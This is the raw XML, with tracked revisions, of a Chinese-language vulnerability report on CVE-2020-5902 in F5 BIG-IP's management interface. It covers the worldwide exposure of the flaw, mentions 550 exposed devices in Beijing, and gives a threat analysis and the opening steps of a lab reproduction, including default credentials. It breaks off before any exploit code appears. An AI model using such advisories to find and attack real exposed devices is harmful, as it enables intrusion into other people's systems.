            <wp:extent cx="2834886" cy="4541914"/>
            <wp:effectExtent l="0" t="0" r="3810" b="0"/>
            <wp:docPr id="1" name="Picture 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9"/>
    </w:p>
    <w:p w14:paraId="6434F8EF" w14:textId="0618BF00" w:rsidR="008C5718" w:rsidRDefault="008C5718">
      <w:pPr>
        <w:pStyle w:val="af7"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="140" w:author="芮志清" w:date="2020-07-10T11:51:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="141" w:author="芮志清" w:date="2020-07-10T11:51:00Z">
          <w:pPr>
            <w:pStyle w:val="af7"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="142" w:author="芮志清" w:date="2020-07-10T11:51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143" w:author="芮志清" w:date="2020-07-10T11:58:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="144" w:author="芮志清" w:date="2020-07-10T11:51:00Z">
        <w:r>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>该漏洞全球影响情况</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="77388FF6" w14:textId="4799AE19" w:rsidR="00422B7D" w:rsidDel="008C5718" w:rsidRDefault="008C5718">
      <w:pPr>
        <w:ind w:left="420"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:del w:id="145" w:author="芮志清" w:date="2020-07-10T11:51:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="146" w:author="芮志清" w:date="2020-07-10T11:51:00Z">
          <w:pPr>
            <w:ind w:left="420"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="af2"/>
        </w:rPr>
        <w:commentReference w:id="139"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="33F76E65" w14:textId="77777777" w:rsidR="00B92280" w:rsidRDefault="00B92280">
      <w:pPr>
        <w:ind w:left="420"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="147" w:author="芮志清" w:date="2020-07-10T11:36:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="148" w:author="芮志清" w:date="2020-07-10T11:51:00Z">
          <w:pPr>
            <w:pStyle w:val="ae"/>
            <w:ind w:firstLine="240"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FF7C5C7" w14:textId="5D7FBE56" w:rsidR="00422B7D" w:rsidRDefault="00B92280" w:rsidP="00B92280">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:ins w:id="149" w:author="芮志清" w:date="2020-07-10T11:33:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="150" w:author="芮志清" w:date="2020-07-10T11:36:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>通过</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="151" w:author="芮志清" w:date="2020-07-10T11:37:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>查询网络测绘系统发现，</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>目前</w:t>
      </w:r>
      <w:del w:id="152" w:author="芮志清" w:date="2020-07-10T11:37:00Z">
        <w:r w:rsidR="00422B7D" w:rsidDel="00B92280">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>还是有</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="153" w:author="芮志清" w:date="2020-07-10T11:37:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>存在</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>大规模的</w:t>
      </w:r>
      <w:del w:id="154" w:author="芮志清" w:date="2020-07-10T11:37:00Z">
        <w:r w:rsidR="00422B7D" w:rsidDel="00B92280">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>类似的</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:t>IG-IP</w:t>
      </w:r>
      <w:ins w:id="155" w:author="芮志清" w:date="2020-07-10T11:37:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>设备</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="156" w:author="芮志清" w:date="2020-07-10T11:37:00Z">
        <w:r w:rsidR="00422B7D" w:rsidDel="00B92280">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>网站</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>暴露在公网下</w:t>
      </w:r>
      <w:ins w:id="157" w:author="芮志清" w:date="2020-07-10T11:37:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>。</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="158" w:author="芮志清" w:date="2020-07-10T11:37:00Z">
        <w:r w:rsidR="00422B7D" w:rsidDel="00B92280">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>，如果该漏洞不被修复，那</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>黑客将</w:t>
      </w:r>
      <w:del w:id="159" w:author="芮志清" w:date="2020-07-10T11:37:00Z">
        <w:r w:rsidR="00422B7D" w:rsidDel="00B92280">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>不费吹灰之力</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="160" w:author="芮志清" w:date="2020-07-10T11:37:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>轻松</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>获取这些网站的大量敏感信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58AC4119" w14:textId="5C4BA711" w:rsidR="00B92280" w:rsidRDefault="006D551D" w:rsidP="00B92280">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:ins w:id="161" w:author="芮志清" w:date="2020-07-10T12:10:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="162" w:author="芮志清" w:date="2020-07-10T11:41:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>其中在北京市发现</w:t>
        </w:r>
        <w:r>
          <w:t>550</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>个此类设备，详细</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>IP</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>信息</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="163" w:author="芮志清" w:date="2020-07-10T11:52:00Z">
        <w:r w:rsidR="008C5718">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>见</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="164" w:author="芮志清" w:date="2020-07-10T11:41:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>在本文档结尾附件。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5D552B50" w14:textId="77777777" w:rsidR="002F059C" w:rsidRPr="005148B5" w:rsidRDefault="002F059C" w:rsidP="00B92280">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F6B5568" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:bookmarkStart w:id="165" w:name="_Toc45275583"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>威胁分析</w:t>
      </w:r>
      <w:bookmarkEnd w:id="165"/>
    </w:p>
    <w:p w14:paraId="03B86920" w14:textId="5DB3216A" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00B92280">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:ins w:id="166" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008C2A9F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>CVE-2020-5902</w:t>
      </w:r>
      <w:r w:rsidRPr="008C2A9F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r w:rsidRPr="008C2A9F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>BIG-IP</w:t>
      </w:r>
      <w:r w:rsidRPr="008C2A9F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>流量管理用户界面（</w:t>
      </w:r>
      <w:r w:rsidRPr="008C2A9F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>TMUI</w:t>
      </w:r>
      <w:r w:rsidRPr="008C2A9F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>）（也称为配置实用程序）中的重要漏洞。</w:t>
      </w:r>
      <w:r w:rsidRPr="00AB571D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>该漏洞的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AB571D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>CVSSv3</w:t>
      </w:r>
      <w:r w:rsidRPr="00AB571D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>评分为</w:t>
      </w:r>
      <w:r w:rsidRPr="00AB571D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>10.0</w:t>
      </w:r>
      <w:r w:rsidRPr="00AB571D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>，这是最高的评分</w:t>
      </w:r>
      <w:r w:rsidRPr="008C2A9F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。通过</w:t>
      </w:r>
      <w:r w:rsidRPr="008C2A9F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>BIG-IP</w:t>
      </w:r>
      <w:r w:rsidRPr="008C2A9F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>管理端口或</w:t>
      </w:r>
      <w:r w:rsidRPr="008C2A9F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>自身</w:t>
      </w:r>
      <w:r w:rsidRPr="008C2A9F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>IP</w:t>
      </w:r>
      <w:r w:rsidRPr="008C2A9F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>公开对</w:t>
      </w:r>
      <w:r w:rsidRPr="008C2A9F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>TMUI</w:t>
      </w:r>
      <w:r w:rsidRPr="008C2A9F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的网络访问时，可以利用此漏洞。成功利用此漏洞将使攻击者获得各种特权，</w:t>
      </w:r>
      <w:r w:rsidRPr="006F3117">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>包括执行任意系统命令或</w:t>
      </w:r>
      <w:r w:rsidRPr="006F3117">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:r w:rsidRPr="006F3117">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>代码</w:t>
      </w:r>
      <w:r w:rsidRPr="008C2A9F">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，创建或删除文件以及禁用易受攻击主机上的服务的能力。该通报指出，该漏洞还可能导致整个系统受损。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD5C197" w14:textId="77777777" w:rsidR="00EA14FB" w:rsidRPr="008408F1" w:rsidRDefault="00EA14FB" w:rsidP="00EA14FB">
      <w:pPr>
        <w:rPr>
          <w:moveTo w:id="167" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="168" w:author="芮志清" w:date="2020-07-10T11:45:00Z" w:name="move45273918"/>
    </w:p>
    <w:p w14:paraId="65707992" w14:textId="77777777" w:rsidR="00EA14FB" w:rsidRDefault="00EA14FB" w:rsidP="00EA14FB">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:rPr>
          <w:moveTo w:id="169" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="170" w:name="_Toc45275584"/>
      <w:moveTo w:id="171" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>攻击复现</w:t>
        </w:r>
        <w:bookmarkEnd w:id="170"/>
      </w:moveTo>
    </w:p>
    <w:p w14:paraId="26F4CD54" w14:textId="1258F683" w:rsidR="00EA14FB" w:rsidRDefault="00EA14FB" w:rsidP="00EA14FB">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:moveTo w:id="172" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="173" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r>
          <w:t xml:space="preserve">. </w:t>
        </w:r>
        <w:commentRangeStart w:id="174"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>首先</w:t>
        </w:r>
        <w:commentRangeStart w:id="175"/>
        <w:del w:id="176" w:author="芮志清" w:date="2020-07-10T11:46:00Z">
          <w:r w:rsidDel="00EA14FB">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>得</w:delText>
          </w:r>
        </w:del>
      </w:moveTo>
      <w:commentRangeEnd w:id="175"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="af2"/>
        </w:rPr>
        <w:commentReference w:id="175"/>
      </w:r>
      <w:moveTo w:id="177" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>下载</w:t>
        </w:r>
      </w:moveTo>
      <w:ins w:id="178" w:author="芮志清" w:date="2020-07-10T11:46:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>BIG</w:t>
        </w:r>
        <w:r>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="179" w:author="芮志清" w:date="2020-07-10T11:47:00Z">
        <w:r>
          <w:t>IP</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>系统的</w:t>
        </w:r>
      </w:ins>
      <w:moveTo w:id="180" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>VMware</w:t>
        </w:r>
      </w:moveTo>
      <w:commentRangeEnd w:id="174"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="af2"/>
        </w:rPr>
        <w:commentReference w:id="174"/>
      </w:r>
      <w:ins w:id="181" w:author="芮志清" w:date="2020-07-10T11:46:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>镜像</w:t>
        </w:r>
      </w:ins>
      <w:moveTo w:id="182" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t xml:space="preserve">, </w:t>
        </w:r>
        <w:del w:id="183" w:author="芮志清" w:date="2020-07-10T11:46:00Z">
          <w:r w:rsidDel="00EA14FB">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>接着</w:delText>
          </w:r>
        </w:del>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>导入</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>VMware</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>后启动，默认密码为</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>root/default</w:t>
        </w:r>
        <w:del w:id="184" w:author="芮志清" w:date="2020-07-10T11:47:00Z">
          <w:r w:rsidDel="00EA14FB">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>，登录后会强制修改密码</w:delText>
          </w:r>
        </w:del>
      </w:moveTo>
      <w:ins w:id="185" w:author="芮志清" w:date="2020-07-10T11:50:00Z">
        <w:r w:rsidR="007B4464">
          <w:softHyphen/>
        </w:r>
        <w:r w:rsidR="007B4464">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>，登陆后会要求强制更改密码</w:t>
        </w:r>
      </w:ins>
      <w:moveTo w:id="186" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>。</w:t>
        </w:r>
      </w:moveTo>
    </w:p>
    <w:p w14:paraId="03FDF845" w14:textId="77777777" w:rsidR="008C5718" w:rsidRDefault="00EA14FB">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="187" w:author="芮志清" w:date="2020-07-10T11:52:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="188" w:author="芮志清" w:date="2020-07-10T11:52:00Z">
          <w:pPr>
            <w:jc w:val="center"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:commentRangeStart w:id="189"/>
      <w:moveTo w:id="190" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidRPr="0050050B">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="25F405D1" wp14:editId="1D8FD8E0">
              <wp:extent cx="3094892" cy="1287780"/>
              <wp:effectExtent l="0" t="0" r="0" b="7620"/>
              <wp:docPr id="1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27987"/>
                      <a:stretch/>
                    </pic:blipFill>
                    <pic:spPr bwMode="auto">
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="3094892" cy="1287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moveTo>
      <w:commentRangeEnd w:id="189"/>
    </w:p>
    <w:p w14:paraId="412A2012" w14:textId="4EEAA588" w:rsidR="008C5718" w:rsidRDefault="008C5718" w:rsidP="008C5718">
      <w:pPr>
        <w:pStyle w:val="af7"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="191" w:author="芮志清" w:date="2020-07-10T11:53:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="192" w:author="芮志清" w:date="2020-07-10T11:52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193" w:author="芮志清" w:date="2020-07-10T11:58:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="194" w:author="芮志清" w:date="2020-07-10T11:52:00Z">
        <w:r>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:t xml:space="preserve"> BIG-IP </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>启动界面</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4A2B0E2D" w14:textId="77777777" w:rsidR="008C5718" w:rsidRPr="008C5718" w:rsidRDefault="008C5718">
      <w:pPr>
        <w:rPr>
          <w:ins w:id="195" w:author="芮志清" w:date="2020-07-10T11:52:00Z"/>
          <w:rPrChange w:id="196" w:author="芮志清" w:date="2020-07-10T11:53:00Z">
            <w:rPr>
              <w:ins w:id="197" w:author="芮志清" w:date="2020-07-10T11:52:00Z"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:id="198" w:author="芮志清" w:date="2020-07-10T11:53:00Z">
          <w:pPr>
            <w:pStyle w:val="af7"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1875C996" w14:textId="16B912FE" w:rsidR="00EA14FB" w:rsidDel="008C5718" w:rsidRDefault="00EA14FB">
      <w:pPr>
        <w:rPr>
          <w:del w:id="199" w:author="芮志清" w:date="2020-07-10T11:52:00Z"/>
          <w:moveTo w:id="200" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="201" w:author="芮志清" w:date="2020-07-10T11:52:00Z">
          <w:pPr>
            <w:jc w:val="center"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:moveTo w:id="202" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="af2"/>
          </w:rPr>
          <w:commentReference w:id="189"/>
        </w:r>
      </w:moveTo>
    </w:p>
    <w:p w14:paraId="79C35090" w14:textId="53E4CA4A" w:rsidR="00EA14FB" w:rsidRDefault="00EA14FB">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:moveTo w:id="203" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="204" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r>
          <w:t>.</w:t>
        </w:r>
      </w:moveTo>
      <w:ins w:id="205" w:author="芮志清" w:date="2020-07-10T11:52:00Z">
        <w:r w:rsidR="008C5718">
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:moveTo w:id="206" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:del w:id="207" w:author="芮志清" w:date="2020-07-10T11:47:00Z">
          <w:r w:rsidDel="00EA14FB">
            <w:delText xml:space="preserve"> </w:delText>
          </w:r>
          <w:r w:rsidDel="00EA14FB">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>进入系统后</w:delText>
          </w:r>
        </w:del>
      </w:moveTo>
      <w:ins w:id="208" w:author="芮志清" w:date="2020-07-10T11:47:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>等待系统正常开启后，进入系统</w:t>
        </w:r>
      </w:ins>
      <w:moveTo w:id="209" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>输入命令</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>config</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>配置</w:t>
        </w:r>
      </w:moveTo>
      <w:commentRangeStart w:id="210"/>
      <w:ins w:id="211" w:author="芮志清" w:date="2020-07-10T11:49:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>IP</w:t>
        </w:r>
        <w:commentRangeEnd w:id="210"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>。</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="af2"/>
          </w:rPr>
          <w:commentReference w:id="210"/>
        </w:r>
      </w:ins>
      <w:commentRangeStart w:id="212"/>
      <w:moveTo w:id="213" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:del w:id="214" w:author="芮志清" w:date="2020-07-10T11:49:00Z">
          <w:r w:rsidDel="00EA14FB">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>ip</w:delText>
          </w:r>
        </w:del>
      </w:moveTo>
      <w:commentRangeEnd w:id="212"/>
      <w:del w:id="215" w:author="芮志清" w:date="2020-07-10T11:49:00Z">
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rStyle w:val="af2"/>
          </w:rPr>
          <w:commentReference w:id="212"/>
        </w:r>
      </w:del>
      <w:moveTo w:id="216" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:del w:id="217" w:author="芮志清" w:date="2020-07-10T11:47:00Z">
          <w:r w:rsidDel="00EA14FB">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>，有的可能会不停报错，需要多等一段时间再输入</w:delText>
          </w:r>
          <w:r w:rsidDel="00EA14FB">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>config</w:delText>
          </w:r>
          <w:r w:rsidDel="00EA14FB">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>就正常了</w:delText>
          </w:r>
        </w:del>
        <w:del w:id="218" w:author="芮志清" w:date="2020-07-10T11:48:00Z">
          <w:r w:rsidDel="00EA14FB">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>。配置好</w:delText>
          </w:r>
          <w:r w:rsidDel="00EA14FB">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>ip</w:delText>
          </w:r>
        </w:del>
      </w:moveTo>
      <w:ins w:id="219" w:author="芮志清" w:date="2020-07-10T11:48:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>之</w:t>
        </w:r>
      </w:ins>
      <w:moveTo w:id="220" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>后</w:t>
        </w:r>
      </w:moveTo>
      <w:ins w:id="221" w:author="芮志清" w:date="2020-07-10T11:48:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>可</w:t>
        </w:r>
      </w:ins>
      <w:moveTo w:id="222" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>在浏览器中访问</w:t>
        </w:r>
        <w:del w:id="223" w:author="芮志清" w:date="2020-07-10T11:48:00Z">
          <w:r w:rsidDel="00EA14FB">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>即可</w:delText>
          </w:r>
        </w:del>
      </w:moveTo>
      <w:ins w:id="224" w:author="芮志清" w:date="2020-07-10T11:48:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>其</w:t>
        </w:r>
        <w:r>
